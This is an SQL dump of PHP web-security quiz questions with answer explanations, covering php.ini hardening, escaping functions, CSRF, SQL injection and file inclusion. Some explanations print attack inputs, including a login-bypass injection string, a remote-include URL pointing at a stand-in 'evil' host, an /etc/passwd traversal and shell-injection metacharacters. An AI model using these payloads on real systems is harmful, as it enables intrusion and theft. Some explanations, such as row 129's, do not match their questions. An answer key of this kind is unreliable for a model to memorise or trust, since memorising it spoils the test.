	(122,4,'Which of the following directives can be .....e shared hosting environment?','','<p><span>Which of the following directives can be used to improve the security while using the shared hosting environment?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, C, and D are correct.</span><br /><br /><span>The open_basedir is used to limit the files that PHP can open to a specified directory tree. If the file/directory exists within the directory tree speci?ed by the open_basedir, it is successfully succeeded; otherwise, it fails to open the file. The disable_functions and disable_classes functions allow you to disable certain native PHP functions and classes for security reasons. safe_mode resolves the security related issues during shared hosting; however, it does not resolve all issues so it is highly depreciated in PHP5.</span><br /><br /><span>Answer option E is incorrect. It is not the correct directive name.</span></p>',0,'2012-11-23 22:29:12','2012-11-23 22:29:12'),
	(123,4,'Which of the following variables are save.....sing the HTTP authentication?','','<p><span>Which of the following variables are saved in the session while using the HTTP authentication?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>In the HTTP authentication, the header() function is used for sending an \"Authentication Required\" message to the client browser, which asks for Username/Password. When the user fills his username and password, the URL containing the PHP script will be called with pre-defined variables PHP_AUTH_USER, PHP_AUTH_PW, and AUTH_TYPE. These variables can be retrieved in the $_SERVER and $HTTP_SERVER_VARS arrays.</span><br /><br /><span>Answer option D is incorrect. This is not a valid predefined variable name used in the HTTP authentication.</span></p>',0,'2012-11-23 22:30:03','2012-11-23 22:30:03'),
	(124,4,'Which of the following directives can you.....documents of the Web folders?','','<p><span>Which of the following directives can you use to prevent users from accessing private documents of the Web folders?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>cgi.force_redirect, doc_root, and user_dir are the runtime directives which can be used to overcome security vulnerabilities in server setups while dealing with restricted directories.</span></p>\r\n<p><span><span>The cgi.force_redirect directive is used to prevent any user from calling PHP directly with a URL like http://any.host/cgi-bin/php/secretdir/script.php. In other words, it blocks the ability to call a directory from URL. It allows PHP to parse only if it has been redirected by the Apache Web-server.</span></span></p>\r\n<p><span><span><span>Answer option D is incorrect. PHP safe mode is a set of controls in PHP that when turned on can force PHP to test for UID permission before opening files. It prevents system() and other calls from working (unless safe_mode_exec_dir is set). It can put restrictions on setting most environment variables (but not reading them). The open_basedir allows hosters to force file access to stay within a virtual directory, but otherwise it is not set.</span></span></span></p>',0,'2012-11-23 22:31:12','2012-11-23 22:31:12'),
	(125,4,'You want to stop showing PHP errors or to..... use to accomplish this task?','','<p><span>You want to stop showing PHP errors or to show only critical errors so that a malicious hacker cannot hack your Website. Which of the following PHP directive settings will you use to accomplish this task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B are correct.</span><br /><br /><span>According to the question, you want to stop showing PHP errors or to show only critical errors so that a malicious hacker cannot hack your Website. For this, you can stop displaying the errors by the following settings in php.ini:</span></p>\r\n<ul>\r\n<li>display_errors = off</li>\r\n<li>log_errors = on</li>\r\n</ul>\r\n<p><span>Answer option C is incorrect. You can show all errors by updating the following directive setting:</span><br /><span>error_reporting = E_ALL | E_STRICT</span><br /><br /><span>Answer option D is incorrect. The cgi.force_redirect directive is used to prevent any user from calling PHP directly with a URL like http://any.host/cgi-bin/php/secretdir/script.php. In other words, it blocks the ability to call a directory from URL. It allows PHP to parse only if it has been redirected by the Apache Web-server.</span></p>',0,'2012-11-23 22:32:02','2012-11-23 22:32:02'),
	(126,4,'What is the default timeout of a session ..... timeout of a session cookie?','','<p><span>What is the default timeout of a session cookie?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>By default, a session cookie is valid until the browser is closed. A session refers to all the connections that can be made by a single client in the course of viewing any pages associated with a given application. Sessions are specific to both the individual user and the application. Therefore, every user of an application has a separate session and has access to a separate set of session variables.</span></p>',0,'2012-11-23 22:33:01','2012-11-23 22:33:01'),
	(127,4,'Which of the following are the limitation.....equest forgery (CSRF) attack?','','<p><span>Which of the following are the limitations for the cross site request forgery (CSRF) attack?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.&nbsp;</span><br /><br /><span>Following are the things have to happen for cross site request forgery to succeed:</span></p>\r\n<ol>\r\n<li>The attacker must target either a site that doesn\'t check the Referrer header (which is common) or a victim with a browser or plugin bug that allows Referrer spoofing (which is rare).</li>\r\n<li>The attacker must find a form submission at the target site that does something useful to the attacker (e.g., transfers money, or changes the victim\'s e-mail address or password).</li>\r\n<li>The attacker must determine the right values for all the form inputs: if any of them are required to be secret authentication values or IDs that the attacker can\'t guess, the attack will fail.</li>\r\n<li>The attacker must lure the victim to a Web page with malicious code while the victim is logged in to the target site.</li>\r\n</ol>\r\n<p><span>Since, the attacker can\'t see what the target Web site sends back to the victim in response to the forged requests, unless he exploits a cross-site scripting or other bug at the target Web site. Similarly, the attacker can only \"click\" any links or submit any forms that come up after the initial forged request, if the subsequent links or forms are similarly predictable. (Multiple \"clicks\" can be simulated by including multiple images on a page, or by using JavaScript to introduce a delay between clicks).</span><uc:iref source=\"wiki\">&nbsp;<br /><br />Answer options C and D are incorrect. These two options are the preventions from cross site request forgeries. Web sites can be prevented from cross site request forgeries (CSRF) by applying the following countermeasures available:</uc:iref></p>\r\n<ul>\r\n<li>Requiring authentication in GET and POST parameters, not only cookies.</li>\r\n<li>Checking the HTTP Referer header.</li>\r\n<li>Ensuring there\'s no crossdomain.xml file granting unintended access to Flash movies.</li>\r\n<li>Limiting the lifetime of authentication cookies.</li>\r\n</ul>\r\n<p>Requiring a secret, user-specific token in all form submissions prevents CSRF; the attacker\'s site can\'t put the right token in its submissions. Individual Web users can do relatively little to prevent cross-site request forgery. Logging out of sites and avoiding their \"remember me\" features can mitigate CSRF risk; not displaying external images or not clicking links in \"spam\" or unreliable e-mails may also help.</p>\r\n<p></p>',0,'2012-11-23 22:34:06','2012-11-23 22:34:06'),
	(128,4,'Consider the following PHP script:..... with this PHP script?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php \r\necho \"Welcome, {$_POST[\'name\']}.\"; \r\n?></pre></span></p>\r\n<p><span><span>What type of attack is possible with this PHP script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>This script is vulnerable to the cross-site scripting attack. Cross Site Scripting vulnerabilities or XSS flaws arise every time an application takes a user-supplied data and sends it to a Web browser without first confirming or encoding the content. A number of times attackers find these flaws in Web applications. XSS flaws allow an attacker to execute a script in the victim\'s browser, allowing him to take control of user sessions, disfigure Web sites, and possibly launch worms, viruses, malware, etc. to steal and access critical data from the user\'s database.</span><br /><br /><span>Answer option A is incorrect. A SQL injection attack is a process in which an attacker tries to execute unauthorized SQL statements. These statements can be used to delete data from a database, delete database objects such as tables, views, stored procedures, etc. An attacker can either directly enter the code into input variables or insert malicious code in strings that can be stored in a database.&nbsp;</span><br /><br /><span>For example, the following line of code illustrates one form of SQL injection attack:</span></p>\r\n<p><span><pre>query = \"SELECT * FROM users WHERE name = \'\" + userName + \"\';\"</pre></span></p>\r\n<p><span><span>This SQL code is designed to fetch the records of any specified username from its table of users. However, if the \"userName\" variable is crafted in a specific way by a malicious hacker, the SQL statement may do more than the code author intended.&nbsp;</span><br /><br /><span>For example, if the attacker puts the \"userName\" value as&nbsp;</span><b>\' or \'\'=\'</b><span>, the SQL statement will now be as follows:</span></span></p>\r\n<p><span><span><pre>SELECT * FROM users WHERE name = \'\' OR \'\'=\'\'; </pre></span></span></p>\r\n<p><span><span><span>Answer option B is incorrect. A replay attack is a type of attack in which attackers capture packets containing passwords or digital signatures whenever packets pass between two hosts on a network. In an attempt to obtain an authenticated connection, the attackers then resend the captured packet to the system. In this type of attack, the attacker does not know the actual password, but can simply replay the captured packet.</span><br /><br /><span>Answer option C is incorrect. This is not an attack but a function to prevent from SQL injection attack.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\" tabindex=\"-1\">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></uc:ref></span></span></p>',0,'2012-11-23 22:36:01','2012-11-23 22:36:01'),
	(129,4,'Which function escapes all of the shell m.....ol operators within a string?','','<p><span>Which function escapes all of the shell metacharacters and control operators within a string?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The mysql_escape_string() function works in the same manner as the mysql_real_escape_string() function. However, the mysql_escape_string() function does not take a connection handler as well as it does not escape the string according to the current character set. Hence, it is obsolete in PHP 5 and has been removed from PHP 6.</span></p>',0,'2012-11-23 22:36:46','2012-11-23 22:36:46'),
	(130,4,'Which of the following is used to convert.....argument for a shell command?','','<p><span>Which of the following is used to convert a scalar value into a single-quote delimited string that can be used safely as a single argument for a shell command?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The escapeshellarg() function is used to convert a scalar value into a single-quote delimited string that can be used safely as a single argument for a shell command. It converts the existing single quotes (\') value to the \'\\\'\'. In this way, this sequence temporarily ends the single-quoted string and inserts a literal single quote, and then resumes the string. Since the data passed through escapeshellarg() can safely be used as a single argument, it can be used to mitigate the command injection attack.</span></p>',0,'2012-11-23 22:37:26','2012-11-23 22:37:26'),
	(131,4,'Which of the following settings will you .....e to secure your application?','','<p><span>Which of the following settings will you use to secure your application?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>The settings for the Webserver when it is going to be on production should be as follows:</span><br /><br /></p>\r\n<ul>\r\n<li>register_globals set to off</li>\r\n<li>display_error set to off</li>\r\n<li>log_errors set to on</li>\r\n<li>allow_url_include set to off</li>\r\n<li>error_reporting = E_ALL &amp; ~E_DEPRECATED</li>\r\n</ul>\r\n<p><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://aymanh.com/checklist-for-securing-php-configuration\" tabindex=\"-1\">http://aymanh.com/checklist-for-securing-php-configuration</a></uc:ref></p>',0,'2012-11-23 22:38:23','2012-11-23 22:38:23'),
	(132,4,'Which of the following directives should ..... to secure your applications?','','<p><span>Which of the following directives should you delete to secure your applications?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>You need to delete the runtime directives cgi.force_redirect, doc_root, and user_dir to overcome security vulnerabilities in server set ups when dealing with the restricted directories.</span><br /><br /><span>Answer option D is incorrect. This is a configuration directory of linux. You cannot delete it.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents: \"Security\"</uc:ref></p>',0,'2012-11-23 22:39:12','2012-11-23 22:39:12'),
	(133,4,'Which of the following are the countermea.....of the remote code injection?','','<p><span>Which of the following are the countermeasures of the remote code injection?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, C, and D are correct.</span><br /><br /><span>You can take the following countermeasures against remote code injection attack:</span><br /><br /></p>\r\n<ul>\r\n<li>Set allow_url_fopen = Off in the php.ini file.</li>\r\n<li>Remove paths using basename() function.</li>\r\n<li>Check data against whitelist.</li>\r\n</ul>\r\n<p><br /><uc:ref>Reference: PHP Manual, Contents: \"Remote code injection\"</uc:ref></p>',0,'2012-11-23 22:40:11','2012-11-23 22:40:11'),
	(134,4,'Which of the following ports is used for .....ts is used for mail transfer?','','<p><span>Which of the following ports is used for mail transfer?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Simple Mail Transfer Protocol (SMTP) is a protocol for sending e-mail messages between servers. E-mailing systems use this protocol to send mails over the Internet. SMTP works on the application layer of the TCP/IP or OSI reference model. The SMTP client typically initiates a Transmission Control Protocol (TCP) connection to the SMTP server on the well-known port designated for SMTP, port number 25. However, e-mail clients require POP or IMAP to retrieve mails from e-mail servers.</span><br /><br /><span>Answer options B, C, and D are incorrect. FTP and SFTP are file transfer protocols. HTTP is used for Web services.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol\" tabindex=\"-1\">http://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol</a></uc:ref></p>',0,'2012-11-23 22:41:03','2012-11-23 22:41:03'),
	(135,4,'Which of the following data types cannot .....ly manipulated by the client?','','<p><span>Which of the following data types cannot be directly manipulated by the client?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Only session data cannot be directly manipulated by the client. It is maintained by the server.&nbsp;</span><br /><br /><span>Answer options B, C, and D are incorrect. Cookie data, remote IP address, and user agent values can be directly manipulated by the clients.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents: \"Security\"</uc:ref></p>',0,'2012-11-23 22:41:50','2012-11-23 22:41:50'),
	(136,4,'When working with the MVC architecture, t..... of the following components?','','<p><span>When working with the MVC architecture, the business logic should be implemented in which of the following components?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>In MVC architecture, business logic should be implemented on model. Model-View-Controller (MVC) is an architectural pattern that isolates business logic from input and presentation, permitting independent development, testing and maintenance of each. It increases the reusability of the components and improves the maintainability of the overall system. There are three components in MVC, which are as follows:&nbsp;</span><br /><br /></p>\r\n<ul>\r\n<li><uc:hed>Model components:&nbsp;</uc:hed>It encapsulates data and behaviors related to the data processed by the application.</li>\r\n<li><uc:hed>View components:&nbsp;</uc:hed>It defines the application\'s user interface, and the user\'s view of application data.</li>\r\n<li><uc:hed>Controller components:&nbsp;</uc:hed>It handles data interconnectivity in the application and provides application management and the business logic of the application.</li>\r\n</ul>',0,'2012-11-23 22:42:40','2012-11-23 22:42:40'),
	(137,4,'In which of the following security settin.....y programs are also disabled?','','<p><span>In which of the following security settings does access to files not owned by Apache is disabled, and access to environment variables and execution of binary programs are also disabled?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The following security settings disable access to files not owned by Apache. It also disables access to environment variables and execution of binary programs:</span></p>\r\n<p><span><pre>safe_mode = On\r\nsafe_mode_gid = On</pre></span></p>\r\n<p><span><span>Answer options C and D are incorrect. These will not be used to disable safe mode settings.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://aymanh.com/checklist-for-securing-php-configuration\" tabindex=\"-1\">http://aymanh.com/checklist-for-securing-php-configuration</a></uc:ref></span></p>',0,'2012-11-23 22:43:55','2012-11-23 22:43:55'),
	(138,4,'John works as a professional Ethical Hack.....ure login page is vulnerable?','','<p><span>John works as a professional Ethical Hacker. He has been assigned the project of testing the security of www.we-are-secure.com. On the We-are-secure login page, he enters =\'or\'\'=\' as a username and successfully logs in to the user page of the Web site. Which of the following attacks to We-are-secure login page is vulnerable?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the given scenario, John is performing a SQL injection attack. A SQL injection attack is a process in which an attacker tries to execute unauthorized SQL statements. These statements can be used to delete data from a database, delete database objects such as tables, views, stored procedures, etc. An attacker can either directly enter the code into input variables or insert malicious code in strings that can be stored in a database.&nbsp;</span><br /><br /><span>For example, the following line of code illustrates one form of SQL injection attack:</span></p>\r\n<p><span><pre>query = \"SELECT * FROM users WHERE name = \'\" + userName + \"\';\"</pre></span></p>\r\n<p><span><span>This SQL code is designed to fetch the records of any specified username from its table of users. However, if the \"userName\" variable is crafted in a specific way by a malicious hacker, the SQL statement may do more than the code author intended.&nbsp;</span><br /><br /><span>For example, if the attacker puts the \"userName\" value as&nbsp;</span><b>\' or \'\'=\'</b><span>, the SQL statement will now be as follows:</span></span></p>\r\n<p><span><span><pre>SELECT * FROM users WHERE name = \'\' OR \'\'=\'\'; </pre></span></span></p>\r\n<p><span><span><span>Answer option B is incorrect. A replay attack is a type of attack in which attackers capture packets containing passwords or digital signatures whenever packets pass between two hosts on a network. In an attempt to obtain an authenticated connection, the attackers then resend the captured packet to the system. In this type of attack, the attacker does not know the actual password, but can simply replay the captured packet.</span><br /><br /><span>Answer option C is incorrect. John is not performing a land attack. In a land attack, the attacker sends a spoofed TCP SYN packet in which the IP address of the target is filled in both the source and destination fields. On receiving the spoofed packet, the target system becomes confused and goes into a frozen state. Nowadays, antivirus software can easily detect such attacks.</span><br /><br /><span>Answer option D is incorrect. A dictionary attack is a type of password guessing attack. This type of attack uses a dictionary of common words to find out the password of a user. It can also use common words in either upper or lower case to find a password. There are many programs available on the Internet to automate and execute dictionary attacks.</span></span></span></p>',0,'2012-11-23 22:45:16','2012-11-23 22:45:16'),
	(139,4,'Which of the following can be used as a c.....ainst a SQL injection attack?','','<p><span>Which of the following can be used as a countermeasure against a SQL injection attack?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>A prepared statement and the mysql_real_escape_string() function can be used as a countermeasure against the SQL injection attack. A prepared statement is a template of an SQL statement that has been pre-parsed and compiled before, and is ready to be executed by passing the appropriate data to it. The parameters of prepared statements are not being quoted since the driver automatically does this. Hence, the prepared statements not only reduce the process of developing same SQL queries too many times, but also reduce the possibilities of SQL injection attacks. The mysql_real_escape_string() function is used to escape special characters in a string for use in a SQL statement. It therefore makes the data safe before sending the query to MYSQL. For example, a user runs the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n     $name = mysql_real_escape_string($_POST[\"name\"]);\r\n     $password = mysql_real_escape_string($_POST[\"password\"]);\r\n ?> </pre></span></p>\r\n<p><span><span>where the mysql_real_escape_string() function escapes all special characters such as \\x00, \\n, \\n, \\, \', \", and \\x1a from strings $_POST[\"name\"] and $_POST[\"password\"]. Hence, the danger of the SQL injection attack is mitigated.</span><br /><br /><span>Answer option C is incorrect. The mysql_escape_string() function works in the same manner as the mysql_real_escape_string() function. However, the mysql_escape_string() function does not take a connection handler as well as it does not escape the string according to the current character set. Hence, it is obsolete in PHP 5 and has been removed from PHP 6.</span><br /><br /><span>Answer option D is incorrect. The session_regenerate_id() function is used to replace the current session id with the new session id, and to keep information of the current session. This function is used as a countermeasure to a session fixation attack in which the attacker attempts to exploit the vulnerability of a system by fixating another person\'s session identifier (SID). The syntax of the session_regenerate_id() function is as follows:</span></span></p>\r\n<p><span><span><pre>bool session_regenerate_id  ([ bool $delete_old_session = false  ])</pre></span></span></p>\r\n<p><span><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/function.mysql-escape-string.php\" tabindex=\"-1\">http://php.net/manual/en/function.mysql-escape-string.php</a></span></span></p>',0,'2012-11-23 22:47:57','2012-11-23 22:47:57'),
	(140,4,'Which of the following functions can you ..... solution. Choose two.','','<p><span>Which of the following functions can you use to mitigate a command injection attack?</span></p>\r\n<p><span><span>Each correct answer represents a complete solution. Choose two.</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>You can use either the escapeshellcmd() or escapeshellarg() function to mitigate a command injection attack. The escapeshellcmd() function escapes all of the shell metacharacters and control operators within a string. It decreases the risks involved in allowing user input to be passed to the shell, by escaping all metacharacters and control operators with backslashes. Hence, it is used to overcome command injection attacks. The escapeshellarg() function is used to convert a scalar value into a single-quote delimited string that can be used safely as a single argument for a shell command. It converts the existing single quotes (\') value to the \'\\\'\'. In this way, this sequence temporarily ends the single-quoted string and inserts a literal single quote, and then resumes the string. Since the data passed through escapeshellarg() can safely be used as a single argument, it can be used to mitigate the command injection attack.</span></p>\r\n<p><span><span>A command injection attack is used to inject and execute commands specified by the attacker in a vulnerable application. The application, which executes unwanted system commands, is like a virtual system shell. The attacker may use it as any authorized system user. However, commands are executed with the same privileges and environment as the application has. Command injection attacks are possible in most cases because of lack of correct input data validation, which can be manipulated by the attacker.</span></span></p>\r\n<p><span><span><span>Answer options C and D are incorrect. The htmlentities() and strip_tags() PHP functions can be used to overcome cross site scripting attacks since these functions attempt to remove all valid HTML and PHP tags.</span></span></span></p>\r\n<p><span><span><span><span>A cross site scripting attack works in the following manner:</span><br /></span></span></span></p>\r\n<ul>\r\n<li>The attacker identifies a web site that has one or more XSS bugs, for example, a web site that echoes the contents of a querystring.</li>\r\n<li>The attacker crafts a special URL that includes a malformed and malicious querystring containing HTML and PHP script.</li>\r\n<li>The attacker finds a victim and gets the victim to click on a link that includes the malformed querystring. This could simply be a link to another web page, or a link in an HTML e-mail.</li>\r\n<li>Once the victim clicks the link, the victim\'s browser makes a GET request to the vulnerable server, bypassing the malicious querystring.</li>\r\n<li>The vulnerable server echoes the malicious querystring back to the victim\'s browser, and the browser executes the PHP Script embedded in the response.</li>\r\n</ul>\r\n<p><span><span><span><br /></span></span></span></p>',0,'2012-11-23 22:49:45','2012-11-23 22:49:45'),
	(141,4,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php \r\n$name = mysql_real_escape_string($_POST[\"name\"]); \r\n$password = mysql_real_escape_string($_POST[\"password\"]); \r\n?> </pre></span></p>\r\n<p><span><span>What is the use of the mysql_real_escape_string() function in the above script.</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The mysql_real_escape_string() function is used to escape special characters in a string for use in a SQL statement. It therefore makes the data safe before sending the query to MYSQL. For example, a user runs the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n     $name = mysql_real_escape_string($_POST[\"name\"]);\r\n     $password = mysql_real_escape_string($_POST[\"password\"]);\r\n ?> </pre></span></p>\r\n<p><span><span>where the mysql_real_escape_string() function escapes all special characters such as \\x00, \\n, \\n, \\, \', \", and \\x1a from strings $_POST[\"name\"] and $_POST[\"password\"]. Hence, the danger of the SQL injection attack is mitigated.</span><br /><br /><span>Answer option C is incorrect. It does not help prevent cross-site scripting attacks that deal with special HTTP and PHP tags.</span><br /><br /><span>Answer option D is incorrect. The mysql_real_escape_string() function will escape all special characters such as \\x00, \\n, \\n, \\, \', \", and \\x1a from strings $_POST[\"name\"] and $_POST[\"password\"].</span></span></p>',0,'2012-11-23 22:51:39','2012-11-23 22:51:39'),
	(142,4,'Consider the PHP program (which includes .....ser want to do?','','<p><span>Consider the PHP program (which includes a file specified by request):</span></p>\r\n<p><span><pre><?php\r\n   $color = \'blue\';\r\n   if (isset( $_GET[\'COLOR\'] ) )\r\n       $color = $_GET[\'COLOR\'];\r\n   require( $color . \'.php\' );\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><form method=\"get\">\r\n     <select name=\"COLOR\">\r\n        <option value=\"red\">red</option>\r\n        <option value=\"blue\">blue</option>\r\n     </select>\r\n     <input type=\"submit\">\r\n</form></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>A malicious user injects the following command:</span></span></p>\r\n<p><span><span><pre>/vulnerable.php?COLOR=C:\\\\notes.txt%00</pre></span></span></p>\r\n<p><span><span><span>where vulnerable.php is a remotely hosted file containing an exploit.</span><br /><br /><span>What does the malicious user want to do?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Here, the malicious user wants to remove the .php suffix, allowing access to files other than .php by using the NULL Meta character. In the include file injection attack, a malicious user injects a remotely hosted file containing an exploit.</span></p>\r\n<p><span><span>The developer thought this would ensure that only blue.php and red.php could be loaded. But as anyone can easily insert arbitrary values in COLOR, it is possible to inject code from files:</span><br /></span></p>\r\n<ul>\r\n<li><uc:stx>/vulnerable.php?COLOR=http://evil/exploit? -</uc:stx>&nbsp;Injects a remotely hosted file containing an exploit.</li>\r\n<li><uc:stx>/vulnerable.php?COLOR=C:\\\\ftp\\\\upload\\\\exploit -</uc:stx>&nbsp;Executes code from an already uploaded file called exploit.php.</li>\r\n<li><uc:stx>/vulnerable.php?COLOR=../../../../../../../../etc/passwd%00</uc:stx>&nbsp;- Allows an attacker to read the contents of the passwd file on a UNIX system directory traversal.</li>\r\n<li><uc:stx>/vulnerable.php?COLOR=C:\\\\notes.txt%00 -</uc:stx>&nbsp;Uses NULL meta character to remove the .php suffix, allowing access to files other than .php. (PHP setting \"magic_quotes_gpc = On\", which is default, would stop this attack)</li>\r\n</ul>\r\n<p><span><br /></span></p>',0,'2012-11-23 22:53:41','2012-11-23 22:53:41'),
	(143,4,'Which of the following functions can be u..... to a Shell Injection attack?','','<p><span>Which of the following functions can be used as a countermeasure to a Shell Injection attack?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The escapeshellarg() and escapeshellcmd() functions can be used as a countermeasure to a Shell Injection attack. The escapeshellarg() function is used to convert a scalar value into a single-quote delimited string that can be used safely as a single argument for a shell command. It converts the existing single quotes (\') value to the \'\\\'\'. In this way, this sequence temporarily ends the single-quoted string and inserts a literal single quote, and then resumes the string. Since the data passed through escapeshellarg() can safely be used as a single argument, it can be used to mitigate the command injection attack.The escapeshellcmd() function escapes all of the shell metacharacters and control operators within a string. It decreases the risks involved in allowing user input to be passed to the shell, by escaping all metacharacters and control operators with backslashes. Hence, it is used to overcome command injection attacks.</span></p>\r\n<p><span><span>Shell Injection is an attack that allows the PHP script to programmatically execute command line. Consider the following short PHP program, which runs an external program called funny text to replace a word the user sent with some other word:</span></span></p>\r\n<p><span><span><pre><?php\r\npassthru ( \" /home/user/phpguru/funnytext \"\r\n      . $_GET[\'USER_INPUT\'] );\r\n?></pre></span></span></p>\r\n<p><span><span><span>This program can be injected in multiple ways:</span><br /></span></span></p>\r\n<ul>\r\n<li>\'command\' will execute command.</li>\r\n<li>$(command) will execute command.</li>\r\n<li>; command will execute command, and output result of command.</li>\r\n<li>| command will.</li>\r\n<li>&amp;&amp; command will execute command, and output result of command.</li>\r\n<li>|| command will execute command, and output result of command.</li>\r\n<li>&gt; /home/user/phpguru/.bashrc will overwrite file .bashrc.</li>\r\n<li>&lt; /home/user/phpguru/.bashrc will send file .bashrc as input to funnytext.</li>\r\n</ul>\r\n<p><span><span><span>PHP offers escapeshellarg() and escapeshellcmd() to perform encoding before calling methods.</span></span></span></p>\r\n<p><span>Answer option C is incorrect. The mysql_real_escape_string() function is used to escape special characters in a string for use in a SQL statement. It therefore makes the data safe before sending the query to MYSQL. For example, a user runs the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n     $name = mysql_real_escape_string($_POST[\"name\"]);\r\n     $password = mysql_real_escape_string($_POST[\"password\"]);\r\n ?> </pre></span></p>\r\n<p><span><span>where the mysql_real_escape_string() function escapes all special characters such as \\x00, \\n, \\n, \\, \', \", and \\x1a from strings $_POST[\"name\"] and $_POST[\"password\"]. Hence, the danger of the SQL injection attack is mitigated.</span><br /><br /><span>Answer option D is incorrect. This is not a valid PHP function.</span></span></p>',0,'2012-11-23 22:55:28','2012-11-23 22:55:28'),
	(144,4,'Which of the following is a PHP script vu..... used to send email messages?','','<p><span>Which of the following is a PHP script vulnerability of the mail() function that can occur in Internet applications that are used to send email messages?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Email injection is a PHP script vulnerability of the mail() function that can occur in Internet applications that are used to send email messages. When a form is added to a web page that submits data to a web application, a malicious user may exploit the MIME format to append additional information to the message being sent, such as a new list of recipients or a completely different message body.&nbsp;</span><br /><br /><span>Because the MIME format uses a carriage return to delimit the information in a message, and only the raw message determines its eventual destination, adding carriage returns to submitted form data can allow a simple guestbook to be used to send thousands of messages at once. A malicious spammer could use this tactic to send large numbers of messages anonymously.&nbsp;</span><uc:iref source=\"wiki\"><br />Email injection is a security vulnerability of mail() function that can occur in internet applications.<br /><br />Answer option B is incorrect. SQL injection refers to attack on database without your knowledge.<br /><br />Answer option C is incorrect. Email Bomber sends unlimited amount of mails to the target.<br /><br />Answer option D is incorrect. Email Scheduler script can send lots of emails at a particular time.</uc:iref></p>',0,'2012-11-23 22:56:12','2012-11-23 22:56:12'),
	(145,4,'Which function is used to get a specific .....ame and optionally filter it?','','<p><span>Which function is used to get a specific external variable by name and optionally filter it?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The filter_input() function gets a specific external variable by name and optionally filters it.</span><br /><br /><span>Answer option B is incorrect. The filter() function is used to validate and filter data that is coming from not secure sources.</span><br /><br /><span>Answer option C is incorrect. This function does not exist.</span><br /><br /><span>Answer option D is incorrect. This function does not exist.</span><br /><br /><span>The filter_input() function is used to get a specific external variable by name and optionally filter it. The syntax of the filter_input() function is as follows:</span></p>\r\n<p><span><pre>filter_input ( int $type , string $variable_name [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) </pre></span></p>\r\n<p><span><span>here, the $type is one of INPUT_GET, INPUT_POST, INPUT_COOKIE, INPUT_SERVER, or INPUT_ENV.</span></span></p>\r\n<p><span><span><pre><?php\r\n    $search_html = filter_input(INPUT_GET, \'search\', FILTER_SANITIZE_SPECIAL_CHARS);\r\n    $search_url = filter_input(INPUT_GET, \'search\', FILTER_SANITIZE_ENCODED);\r\n?> </pre></span></span></p>',0,'2012-11-23 22:57:31','2012-11-23 22:57:31'),
	(146,4,'Which of the following is used to escape .....her various types of attacks?','','<p><span>Which of the following is used to escape output and remove special characters to prevent from SQL injection attack, XSS attack, and other various types of attacks?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The escape output procedure is used to escape output and remove special characters to prevent from SQL injection attack, XSS attack, and other various types of attacks. If you want to escape the data to html you should use htmlspecialchars() else, if you are storing the data in a database you should escape strings using mysqli_real_escape_string().&nbsp;</span><br /><span>The escape output procedure is used to escape output and remove special characters to prevent from SQL injection attack, XSS attack, and other various types of attacks. If you want to escape the data to html you should use htmlspecialchars() else, if you are storing the data in a database you should escape strings using mysqli_real_escape_string().</span></p>',0,'2012-11-23 22:58:52','2012-11-23 22:58:52'),
